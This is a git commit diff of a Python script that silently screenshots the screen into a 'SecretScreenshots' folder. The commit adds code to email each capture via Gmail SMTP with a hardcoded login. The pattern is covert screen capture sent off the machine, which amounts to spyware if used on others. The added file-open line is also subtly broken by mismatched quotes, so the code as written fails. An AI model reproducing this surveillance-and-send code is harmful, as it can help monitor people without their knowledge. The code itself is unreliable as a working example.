253503cb5e3e0b745badde9e0d881e25d249982e
ChristofferBrydensholtt <105556307+ChristofferBrydensholtt@users.noreply.github.com>
2023-03-30 16:52:45 +0900

    Add files via upload
    with email

--- main.py
+++ main.py
@@ -1,7 +1,14 @@
 from PIL import ImageGrab
 from datetime import datetime
+import smtplib
+import imghdr
+from email.message import EmailMessage
+
 
 def screenshot():
+
+
+
 
     now = datetime.now()
 
@@ -10,6 +17,22 @@ def screenshot():
     save_path = "C:\\Users\\Christoffer\\Documents\\SecretScreenshots\\ss" +  dt_string + ".png"
     snapshot.save(save_path)
 
+    Sender_Email = "cbrydensholt@gmail.com"
+    Reciever_Email = "cbrydensholt@gmail.com"
+    Password = "hidden"
+    newMessage = EmailMessage()
+    newMessage['Subject'] = "New screenshot arrived"
+    newMessage['From'] = Sender_Email
+    newMessage['To'] = Reciever_Email
+    newMessage.set_content('New screenshot from time: ' + dt_string)
+    with open('C:\\Users\\Christoffer\\Documents\\SecretScreenshots\\ss" +  dt_string + ".png', 'rb') as f:
+        image_data = f.read()
+        image_type = imghdr.what(f.name)
+        image_name = f.name
+    newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+        smtp.login(Sender_Email, Password)
+        smtp.send_message(newMessage)
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
